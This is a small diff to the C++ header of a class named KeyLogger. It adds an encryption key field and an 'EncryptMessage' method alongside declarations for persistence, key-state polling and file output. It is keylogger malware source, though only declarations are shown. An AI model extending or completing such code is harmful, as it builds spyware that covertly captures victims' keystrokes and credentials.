@@ -13,6 +13,7 @@ class KeyLogger
 private:
 	std::string OutPath;
 	std::ofstream OutFile;
+	int EncryptKey;
 
 	HWND Console;
 
@@ -26,6 +27,7 @@ public:
 	void WriteMessage(std::string Message);
 	bool RegisterPersistence();
 	bool IsPressed(int Key);
+	void EncryptMessage(std::string& Message);
 };
 
 #endif
